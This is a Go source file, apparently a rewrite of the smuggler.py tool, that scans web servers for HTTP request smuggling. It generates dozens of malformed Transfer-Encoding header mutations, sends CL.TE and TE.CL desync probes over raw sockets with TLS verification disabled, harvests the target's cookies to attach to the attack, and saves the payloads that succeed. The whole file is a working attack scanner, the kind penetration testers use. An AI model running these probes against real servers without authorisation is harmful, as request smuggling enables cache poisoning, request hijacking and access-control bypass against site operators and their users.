
package main

import (
        "bufio"
        "bytes"
        "crypto/tls"
        "fmt"
        "io"
        "io/ioutil"
        "math/rand"
        "net"
        "net/url"
        "os"
        "path/filepath"
        "regexp"
        "strconv"
        "strings"
        "time"
)

// ------------------------------
// Global constants and variables

var (
        // ANSI colors (if enabled)
        ColorCyan    = "\033[36m"
        ColorMagenta = "\033[35m"
        ColorYellow  = "\033[33m"
        ColorRed     = "\033[31m"
        ColorGreen   = "\033[32m"
        ColorReset   = "\033[0m"
        StyleBright  = "\033[1m"

        NOCOLOR bool // set from CLI

        // proxyAddr if set makes the program route connections via the specified HTTP proxy.
        // Expected format: "host:port"
        proxyAddr string
)

// EndChunk is the terminating chunk marker for chunked encoding.
const EndChunk = "0\r\n\r\n"

// ------------------------------
// Payload type and helper functions

type Payload struct {
        Header   string
        Body     string
        Method   string
        Endpoint string
        Host     string
        CL       int // if <0 then use len(body) in replacement
}

func (p *Payload) String() string {
        if p.Header == "" {
                panic("No header data specified in Payload instance")
        }
        if p.Host == "" {
                panic("No host specified in Payload instance")
        }
        result := p.Header + "\r\n" + p.Body
        result = replaceRandom(result)
        clVal := p.CL
        if clVal < 0 {
                clVal = len(p.Body)
        }
        result = strings.ReplaceAll(result, "__REPLACE_CL__", strconv.Itoa(clVal))
        result = strings.ReplaceAll(result, "__METHOD__", p.Method)
        result = strings.ReplaceAll(result, "__ENDPOINT__", p.Endpoint)
        result = strings.ReplaceAll(result, "__HOST__", p.Host)
        return result
}

func replaceRandom(text string) string {
        re := regexp.MustCompile(`__RANDOM__`)
        return re.ReplaceAllStringFunc(text, func(match string) string {
                f := rand.Float64()
                parts := strings.Split(fmt.Sprintf("%f", f), ".")
                if len(parts) > 1 {
                        return parts[1]
                }
                return "0"
        })
}

func Chunked(data string) string {
        return fmt.Sprintf("%x\r\n%s\r\n", len(data), data)
}

// ------------------------------
// renderTemplate and mutations initialization

func renderTemplate(gadget string) *Payload {
        RN := "\r\n"
        p := &Payload{
                Header: "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN +
                        gadget + RN +
                        "Host: __HOST__" + RN +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN +
                        "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN +
                        "Content-Length: __REPLACE_CL__" + RN,
                Body:     "",
                Method:   "GET",
                Endpoint: "/",
                Host:     "",
                CL:       -1,
        }
        return p
}

func initMutations() map[string]*Payload {
        mutations := make(map[string]*Payload)
        mutations["nameprefix1"] = renderTemplate(" Transfer-Encoding: chunked")
        mutations["tabprefix1"] = renderTemplate("Transfer-Encoding:\tchunked")
        mutations["tabprefix2"] = renderTemplate("Transfer-Encoding\t:\tchunked")
        mutations["spacejoin1"] = renderTemplate("Transfer Encoding: chunked")
        mutations["underjoin1"] = renderTemplate("Transfer_Encoding: chunked")
        mutations["smashed"] = renderTemplate("Transfer Encoding:chunked")
        mutations["space1"] = renderTemplate("Transfer-Encoding : chunked")
        mutations["valueprefix1"] = renderTemplate("Transfer-Encoding:  chunked")
        mutations["vertprefix1"] = renderTemplate("Transfer-Encoding:\u000Bchunked")
        mutations["commaCow"] = renderTemplate("Transfer-Encoding: chunked, cow")
        mutations["cowComma"] = renderTemplate("Transfer-Encoding: cow, chunked")
        mutations["contentEnc"] = renderTemplate("Content-Encoding: chunked")
        mutations["linewrapped1"] = renderTemplate("Transfer-Encoding:\n chunked")
        mutations["quoted"] = renderTemplate("Transfer-Encoding: \"chunked\"")
        mutations["aposed"] = renderTemplate("Transfer-Encoding: 'chunked'")
        mutations["lazygrep"] = renderTemplate("Transfer-Encoding: chunk")
        mutations["sarcasm"] = renderTemplate("TrAnSFer-EnCODinG: cHuNkeD")
        mutations["yelling"] = renderTemplate("TRANSFER-ENCODING: CHUNKED")
        mutations["0dsuffix"] = renderTemplate("Transfer-Encoding: chunked\r")
        mutations["tabsuffix"] = renderTemplate("Transfer-Encoding: chunked\t")
        mutations["revdualchunk"] = renderTemplate("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
        mutations["0dspam"] = renderTemplate("Transfer\r-Encoding: chunked")
        mutations["nested"] = renderTemplate("Transfer-Encoding: cow chunked bar")
        mutations["spaceFF"] = renderTemplate("Transfer-Encoding:\xFFchunked")
        mutations["accentCH"] = renderTemplate("Transfer-Encoding: ch\x96nked")
        mutations["accentTE"] = renderTemplate("Transf\x82r-Encoding: chunked")
        mutations["x-rout"] = renderTemplate("X:X\rTransfer-Encoding: chunked")
        mutations["x-nout"] = renderTemplate("X:X\nTransfer-Encoding: chunked")
        for i := 0x1; i < 0x20; i++ {
                keyA := fmt.Sprintf("%02x-%02x-XX-XX", i, i)
                mutations[keyA] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding%c: chunked", i, i))
                keyB := fmt.Sprintf("%02x-XX-%02x-XX", i, i)
                mutations[keyB] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding:%cchunked", i, i))
                keyC := fmt.Sprintf("%02x-XX-XX-%02x", i, i)
                mutations[keyC] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding: chunked%c", i, i))
                keyD := fmt.Sprintf("XX-%02x-%02x-XX", i, i)
                mutations[keyD] = renderTemplate(fmt.Sprintf("Transfer-Encoding%c:%cchunked", i, i))
                keyE := fmt.Sprintf("XX-%02x-XX-%02x", i, i)
                mutations[keyE] = renderTemplate(fmt.Sprintf("Transfer-Encoding%c: chunked%c", i, i))
                keyF := fmt.Sprintf("XX-XX-%02x-%02x", i, i)
                mutations[keyF] = renderTemplate(fmt.Sprintf("Transfer-Encoding:%cchunked%c", i, i))
                keyMid := fmt.Sprintf("midspace-%02x", i)
                mutations[keyMid] = renderTemplate(fmt.Sprintf("Transfer-Encoding:%cchunked", i))
                keyPost := fmt.Sprintf("postspace-%02x", i)
                mutations[keyPost] = renderTemplate(fmt.Sprintf("Transfer-Encoding%c: chunked", i))
                keyPre := fmt.Sprintf("prespace-%02x", i)
                mutations[keyPre] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding: chunked", i))
                keyEnd := fmt.Sprintf("endspace-%02x", i)
                mutations[keyEnd] = renderTemplate(fmt.Sprintf("Transfer-Encoding: chunked%c", i))
        }
        for i := 0x7F; i < 0x100; i++ {
                keyMid := fmt.Sprintf("midspace-%02x", i)
                mutations[keyMid] = renderTemplate(fmt.Sprintf("Transfer-Encoding:%cchunked", i))
                keyPost := fmt.Sprintf("postspace-%02x", i)
                mutations[keyPost] = renderTemplate(fmt.Sprintf("Transfer-Encoding%c: chunked", i))
                keyPre := fmt.Sprintf("prespace-%02x", i)
                mutations[keyPre] = renderTemplate(fmt.Sprintf("%cTransfer-Encoding: chunked", i))
                keyEnd := fmt.Sprintf("endspace-%02x", i)
                mutations[keyEnd] = renderTemplate(fmt.Sprintf("Transfer-Encoding: chunked%c", i))
        }
        return mutations
}

// ------------------------------
// EasySSL equivalent functions

func easySSLConnect(host string, port int, timeout time.Duration, useTLS bool) (net.Conn, error) {
        targetAddr := fmt.Sprintf("%s:%d", host, port)
        var conn net.Conn
        var err error

        if proxyAddr != "" {
                conn, err = net.DialTimeout("tcp", proxyAddr, timeout)
                if err != nil {
                        return nil, err
                }
                if useTLS {
                        connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetAddr, targetAddr)
                        conn.SetWriteDeadline(time.Now().Add(timeout))
                        _, err = conn.Write([]byte(connectReq))
                        if err != nil {
                                conn.Close()
                                return nil, err
                        }
                        conn.SetReadDeadline(time.Now().Add(timeout))
                        respReader := bufio.NewReader(conn)
                        resp, err := respReader.ReadString('\n')
                        if err != nil {
                                conn.Close()
                                return nil, err
                        }
                        if !strings.Contains(resp, "200") {
                                conn.Close()
                                return nil, fmt.Errorf("proxy CONNECT failed: %s", resp)
                        }
                        for {
                                line, err := respReader.ReadString('\n')
                                if err != nil {
                                        break
                                }
                                if line == "\r\n" {
                                        break
                                }
                        }
                }
                conn.SetDeadline(time.Now().Add(timeout))
        } else {
                addr := fmt.Sprintf("%s:%d", host, port)
                conn, err = net.DialTimeout("tcp", addr, timeout)
                if err != nil {
                        return nil, err
                }
                conn.SetDeadline(time.Now().Add(timeout))
        }

        if useTLS && proxyAddr == "" {
                config := &tls.Config{
                        InsecureSkipVerify: true,
                }
                tlsConn := tls.Client(conn, config)
                err = tlsConn.Handshake()
                if err != nil {
                        return nil, err
                }
                tlsConn.SetDeadline(time.Now().Add(timeout))
                return tlsConn, nil
        } else if useTLS && proxyAddr != "" {
                config := &tls.Config{
                        InsecureSkipVerify: true,
                        ServerName:         host,
                }
                tlsConn := tls.Client(conn, config)
                err = tlsConn.Handshake()
                if err != nil {
                        return nil, err
                }
                tlsConn.SetDeadline(time.Now().Add(timeout))
                return tlsConn, nil
        }
        return conn, nil
}

// ------------------------------
// Desyncr type and methods

type Desyncr struct {
        host      string
        port      int
        method    string
        endpoint  string
        vhost     string
        url       string
        timeout   time.Duration
        sslFlag   bool
        logh      io.Writer
        quiet     bool
        exitEarly bool
        attempts  int
        cookies   []string
        mutations map[string]*Payload
}

func (d *Desyncr) test(p *Payload) (int, string, *Payload) {
        conn, err := easySSLConnect(d.host, d.port, d.timeout, d.sslFlag)
        if err != nil {
                return -1, "", p
        }
        defer conn.Close()

        payloadStr := p.String()
        _, err = conn.Write([]byte(payloadStr))
        if err != nil {
                return -1, "", p
        }

        startTime := time.Now()
        conn.SetReadDeadline(time.Now().Add(d.timeout))
        buf := make([]byte, 4096)
        n, err := conn.Read(buf)
        endTime := time.Now()
        if err != nil {
                if ne, ok := err.(net.Error); ok && ne.Timeout() {
                        if endTime.Sub(startTime) < d.timeout-time.Second {
                                return 2, "", p
                        }
                        return 1, "", p
                }
                return -1, "", p
        }

        var resFiltered bytes.Buffer
        for i := 0; i < n; i++ {
                if buf[i] > 0x7F {
                        resFiltered.WriteByte('0')
                } else {
                        resFiltered.WriteByte(buf[i])
                }
        }

        return 0, resFiltered.String(), p
}

func (d *Desyncr) getCookies() bool {
        RN := "\r\n"
        p := &Payload{
                Host:     d.host,
                Method:   "GET",
                Endpoint: d.endpoint,
                Header: "__METHOD__ __ENDPOINT__?cb=" + randomString(5) + " HTTP/1.1" + RN +
                        "Host: __HOST__" + RN +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN +
                        "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN +
                        "Content-Length: 0" + RN,
                Body: "",
                CL:   -1,
        }
        conn, err := easySSLConnect(d.host, d.port, 2*time.Second, d.sslFlag)
        if err != nil {
                printInfo("Error      : "+ColorCyan+"Unable to connect to host"+ColorMagenta, d.logh)
                return false
        }
        defer conn.Close()

        _, err = conn.Write([]byte(p.String()))
        if err != nil {
                printInfo("Error      : "+ColorCyan+"Failed to send cookies request"+ColorMagenta, d.logh)
                return false
        }

        time.Sleep(500 * time.Millisecond)
        conn.SetReadDeadline(time.Now().Add(2 * time.Second))
        response, err := ioutil.ReadAll(conn)
        if err != nil {
                return true
        }

        lines := strings.Split(string(response), RN)
        for _, line := range lines {
                if len(line) > 11 && strings.ToLower(strings.ReplaceAll(line[0:11], " ", "")) == "set-cookie:" {
                        cookie := strings.Split(strings.ToLower(strings.Replace(line, "set-cookie:", "", 1)), ";")[0] + ";"
                        d.cookies = append(d.cookies, cookie)
                }
        }
        printInfo(fmt.Sprintf("Cookies    : %s (Appending to the attack)", ColorCyan+fmt.Sprintf("%d", len(d.cookies))+ColorMagenta), d.logh)
        return true
}

func (d *Desyncr) checkTECL(payload *Payload, ptype int) (int, string, *Payload) {
        tePayload := *payload
        if d.vhost == "" {
                tePayload.Host = d.host
        } else {
                tePayload.Host = d.vhost
        }
        tePayload.Method = d.method
        tePayload.Endpoint = d.endpoint
        if len(d.cookies) > 0 {
                tePayload.Header += "Cookie: " + strings.Join(d.cookies, "") + "\r\n"
        }
        if ptype == 0 {
                tePayload.CL = 6
        } else {
                tePayload.CL = 5
        }
        tePayload.Body = EndChunk + "X"
        return d.test(&tePayload)
}

func (d *Desyncr) checkCLTE(payload *Payload, ptype int) (int, string, *Payload) {
        tePayload := *payload
        if d.vhost == "" {
                tePayload.Host = d.host
        } else {
                tePayload.Host = d.vhost
        }
        tePayload.Method = d.method
        tePayload.Endpoint = d.endpoint
        if len(d.cookies) > 0 {
                tePayload.Header += "Cookie: " + strings.Join(d.cookies, "") + "\r\n"
        }
        if ptype == 0 {
                tePayload.CL = 4
        } else {
                tePayload.CL = 11
        }
        tePayload.Body = Chunked("Z") + EndChunk
        return d.test(&tePayload)
}

// extractStatusCode parses the first line of an HTTP response and returns the status code.
func extractStatusCode(response string) string {
        scanner := bufio.NewScanner(strings.NewReader(response))
        if scanner.Scan() {
                line := scanner.Text() // e.g., "HTTP/1.1 200 OK"
                parts := strings.Split(line, " ")
                if len(parts) >= 2 {
                        return parts[1]
                }
        }
        return "N/A"
}

// createExecTest uses prettyPrint (like the original Go program) to print the checking line,
// then updates that line when status codes are received.
func (d *Desyncr) createExecTest(name string, tePayload *Payload) bool {
        // Use the original prettyPrint function to display the message.
        prettyPrint := func(label, msg string) {
                fmt.Printf("\r%s\r", strings.Repeat(" ", 100))
                // Build the output with payload name in cyan wrapped within magenta brackets.
                output := StyleBright + ColorMagenta + fmt.Sprintf("[%s]%s: %s", ColorCyan+label+ColorMagenta, strings.Repeat(" ", 13-len(label)), msg) + ColorReset
                fmt.Print(cf(output))
                if d.logh != nil {
                        fmt.Fprintln(d.logh, stripANSI(output))
                }
        }

        // Start with an initial checking line.
        prettyPrint(name, "Checking...")
        // Pause briefly
        time.Sleep(200 * time.Millisecond)

        // TECL test.
        startTime := time.Now()
        teclCode, teclRes, _ := d.checkTECL(tePayload, 0)
        teclTime := time.Since(startTime).Seconds()
        var statusTecl string
        if teclCode == 0 {
                statusTecl = extractStatusCode(teclRes)
        } else {
                statusTecl = "ERR"
        }
        // Update line after TECL test.
        prettyPrint(name, fmt.Sprintf("TECL: %s (%.2fs)", statusTecl, teclTime))

        // CLTE test.
        startTime = time.Now()
        clteCode, clteRes, _ := d.checkCLTE(tePayload, 0)
        clteTime := time.Since(startTime).Seconds()
        var statusClte string
        if clteCode == 0 {
                statusClte = extractStatusCode(clteRes)
        } else {
                statusClte = "ERR"
        }
        // Build final message.
        finalMsg := fmt.Sprintf("TECL: %s (%.2fs) | CLTE: %s (%.2fs)", statusTecl, teclTime, statusClte, clteTime)
        if teclCode == 1 || clteCode == 1 {
                finalMsg += " - TIMEOUT"
        } else if teclCode == -1 || clteCode == -1 {
                finalMsg += " - SOCKET ERROR"
        } else if teclCode == 2 || clteCode == 2 {
                finalMsg += " - DISCONNECTED"
        }
        prettyPrint(name, finalMsg)
        fmt.Println()

        // Edge-case retry logic.
        if clteCode == 1 {
                edgeCode, _, _ := d.checkCLTE(tePayload, 1)
                if edgeCode == 0 {
                        d.attempts++
                        if d.attempts < 3 {
                                return d.createExecTest(name, tePayload)
                        } else {
                                prettyPrint(name, fmt.Sprintf("Potential CLTE Issue Found - %s @ http://%s%s", d.method, d.host, d.endpoint))
                                writePayload(d.host, tePayload, "CLTE", name, d.url, d.sslFlag)
                                d.attempts = 0
                                fmt.Println()
                                return true
                        }
                } else {
                        prettyPrint(name, ColorYellow+"CLTE TIMEOUT ON BOTH LENGTH 4 AND 11"+ColorReset)
                        fmt.Println()
                }
        } else if teclCode == 1 {
                edgeCode, _, _ := d.checkTECL(tePayload, 1)
                if edgeCode == 0 {
                        d.attempts++
                        if d.attempts < 3 {
                                return d.createExecTest(name, tePayload)
                        } else {
                                prettyPrint(name, fmt.Sprintf("Potential TECL Issue Found - %s @ http://%s%s", d.method, d.host, d.endpoint))
                                writePayload(d.host, tePayload, "TECL", name, d.url, d.sslFlag)
                                d.attempts = 0
                                fmt.Println()
                                return true
                        }
                } else {
                        prettyPrint(name, ColorYellow+"TECL TIMEOUT ON BOTH LENGTH 6 AND 5"+ColorReset)
                        fmt.Println()
                }
        } else if teclCode == -1 || clteCode == -1 {
                prettyPrint(name, ColorYellow+"SOCKET ERROR"+ColorReset)
                fmt.Println()
        }
        d.attempts = 0
        return false
}

func writePayload(smhost string, payload *Payload, ptype, name, urlStr string, sslFlag bool) {
        furl := strings.ReplaceAll(smhost, ".", "_")
        if sslFlag {
                furl = "https_" + furl
        } else {
                furl = "http_" + furl
        }
        exePath, err := os.Executable()
        if err != nil {
                exePath = os.Args[0]
        }
        baseDir := filepath.Dir(exePath)
        fname := filepath.Join(baseDir, "payloads", fmt.Sprintf("%s_%s_%s.txt", furl, ptype, name))
        fmt.Printf("\r%s\r", strings.Repeat(" ", 100))
        fmt.Printf("%s\n", cf(fmt.Sprintf("[%sCRITICAL%s] %s Payload: %s URL: %s", ColorMagenta, ColorReset, ptype, ColorCyan+fname+ColorMagenta, ColorCyan+urlStr)))
        ioutil.WriteFile(fname, []byte(payload.String()), 0644)
}

func (d *Desyncr) run() {
        if !d.getCookies() {
                return
        }
        d.mutations = initMutations()
        for mutName, mutPayload := range d.mutations {
                mutPayload.Host = d.host
                if d.createExecTest(mutName, mutPayload) && d.exitEarly {
                        break
                }
        }
        if d.quiet {
                fmt.Printf("\r%s\r", strings.Repeat(" ", 100))
        }
}

// ------------------------------
// Utility functions

func randomString(n int) string {
        const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        b := make([]byte, n)
        for i := range b {
                b[i] = letters[rand.Intn(len(letters))]
        }
        return string(b)
}

func cf(text string) string {
        if NOCOLOR {
                return stripANSI(text)
        }
        return text
}

func stripANSI(text string) string {
        re := regexp.MustCompile(`\x1B\[[0-?]*[ -/]*[@-~]`)
        return re.ReplaceAllString(text, "")
}

func printInfo(msg string, fileHandle io.Writer) {
        output := StyleBright + ColorMagenta + "[+]" + " " + msg + ColorReset
        fmt.Println(cf(output))
        if fileHandle != nil {
                fmt.Fprintln(fileHandle, stripANSI(output))
        }
}

func processURI(uriStr string) (string, int, string, bool) {
        u, err := url.Parse(uriStr)
        if err != nil {
                printInfo("Error malformed URL not supported: "+uriStr, nil)
                os.Exit(1)
        }
        var sslFlag bool
        var stdPort int
        if u.Scheme == "https" {
                sslFlag = true
                stdPort = 443
        } else if u.Scheme == "http" {
                sslFlag = false
                stdPort = 80
        } else {
                printInfo("Error malformed URL not supported: "+uriStr, nil)
                os.Exit(1)
        }
        port := stdPort
        if u.Port() != "" {
                fmt.Sscanf(u.Port(), "%d", &port)
        }
        return u.Hostname(), port, u.Path, sslFlag
}


func banner(version string) {
    fmt.Println(cf(ColorCyan))
    fmt.Println(cf("                                          ______   ______  "))
    fmt.Println(cf("                                         /      \\ /      \\ "))
    fmt.Println(cf("  _______ ______ ____  __    __  ______ |  ▓▓▓▓▓▓\\  ▓▓▓▓▓▓\\"))
    fmt.Println(cf(" /       \\      \\    \\|  \\  |  \\/      \\| ▓▓ __\\▓▓ ▓▓  | ▓▓"))
    fmt.Println(cf("|  ▓▓▓▓▓▓▓ ▓▓▓▓▓▓\\▓▓▓▓\\ ▓▓  | ▓▓  ▓▓▓▓▓▓\\ ▓▓|    \\ ▓▓  | ▓▓"))
    fmt.Println(cf(" \\▓▓    \\| ▓▓ | ▓▓ | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓ \\▓▓▓▓ ▓▓  | ▓▓"))
    fmt.Println(cf(" _\\▓▓▓▓▓▓\\ ▓▓ | ▓▓ | ▓▓ ▓▓__/ ▓▓ ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓__/ ▓▓"))
    fmt.Println(cf("|       ▓▓ ▓▓ | ▓▓ | ▓▓\\▓▓    ▓▓\\▓▓    ▓▓\\▓▓    ▓▓\\▓▓    ▓▓"))
    fmt.Println(cf(" \\▓▓▓▓▓▓▓ \\▓▓  \\▓▓  \\▓▓ \\▓▓▓▓▓▓ _\\▓▓▓▓▓▓▓ \\▓▓▓▓▓▓  \\▓▓▓▓▓▓ "))
    fmt.Println(cf("                               |  \\__| ▓▓                  "))
    fmt.Println(cf("                                \\▓▓    ▓▓                  "))
    fmt.Println(cf("                                 \\▓▓▓▓▓▓                   "))
    fmt.Println(cf(""))
    fmt.Println(cf(fmt.Sprintf("     a rewrite of @defparam's smuggler.py                         %s", version)))
    fmt.Println(cf(ColorReset))
}

// ------------------------------
// Main
func main() {
        rand.Seed(time.Now().UnixNano())

        // Command-line flag parsing.
        urlArg := ""
        vhost := ""
        exitEarly := false
        method := "POST"
        logPath := ""
        quiet := false
        timeoutSec := 5.0
        noColor := false

        args := os.Args[1:]
        for i := 0; i < len(args); i++ {
                switch args[i] {
                case "-u", "--url":
                        i++
                        urlArg = args[i]
                case "-v", "--vhost":
                        i++
                        vhost = args[i]
                case "--exit_early":
                        exitEarly = true
                case "-m", "--method":
                        i++
                        method = strings.ToUpper(args[i])
                case "-l", "--log":
                        i++
                        logPath = args[i]
                case "-q", "--quiet":
                        quiet = true
                case "-t", "--timeout":
                        i++
                        if t, err := strconv.ParseFloat(args[i], 64); err == nil {
                                timeoutSec = t
                        }
                case "--no-color":
                        noColor = true
                case "-x":
                        i++
                        proxyAddr = args[i]
                }
        }

        NOCOLOR = noColor
        if os.PathSeparator == '\\' {
                NOCOLOR = true
        }

        Version := "v1.0"
        banner(Version)

        var servers []string
        if urlArg == "" {
                stat, _ := os.Stdin.Stat()
                if (stat.Mode() & os.ModeCharDevice) != 0 {
                        printInfo("Error: no direct URL or piped URL specified", nil)
                        fmt.Println("Usage: smuggler -u <url> [other options]")
                        os.Exit(1)
                }
                scanner := bufio.NewScanner(os.Stdin)
                for scanner.Scan() {
                        line := scanner.Text()
                        if strings.TrimSpace(line) != "" {
                                servers = append(servers, line)
                        }
                }
        } else {
                servers = []string{urlArg + " " + method}
        }

        var logh io.Writer
        if logPath != "" {
                f, err := os.Create(logPath)
                if err != nil {
                        printInfo("Error: Issue with log file destination", nil)
                        os.Exit(1)
                }
                defer f.Close()
                logh = f
        }

        for _, server := range servers {
                if strings.TrimSpace(server) == "" {
                        continue
                }
                tokens := strings.Fields(server)
                if len(tokens) == 1 {
                        tokens = append(tokens, method)
                }
                if !strings.HasPrefix(strings.ToLower(strings.TrimSpace(tokens[0])), "http") {
                        tokens[0] = "https://" + tokens[0]
                }
                host, port, endpoint, sslFlag := processURI(tokens[0])
                methodUpper := strings.ToUpper(tokens[1])
                printInfo("URL        : "+ColorCyan+tokens[0], logh)
                printInfo("Method     : "+ColorCyan+methodUpper, logh)
                printInfo("Endpoint   : "+ColorCyan+endpoint, logh)
                printInfo("Timeout    : "+ColorCyan+fmt.Sprintf("%.1f", timeoutSec)+" "+ColorMagenta+"seconds", logh)

                sm := Desyncr{
                        host:      host,
                        port:      port,
                        method:    methodUpper,
                        endpoint:  endpoint,
                        vhost:     vhost,
                        url:       tokens[0],
                        timeout:   time.Duration(timeoutSec * float64(time.Second)),
                        sslFlag:   sslFlag,
                        logh:      logh,
                        quiet:     quiet,
                        exitEarly: exitEarly,
                        cookies:   []string{},
                }
                sm.run()
        }

        if logh != nil {
                if f, ok := logh.(*os.File); ok {
                        f.Close()
                }
        }
}
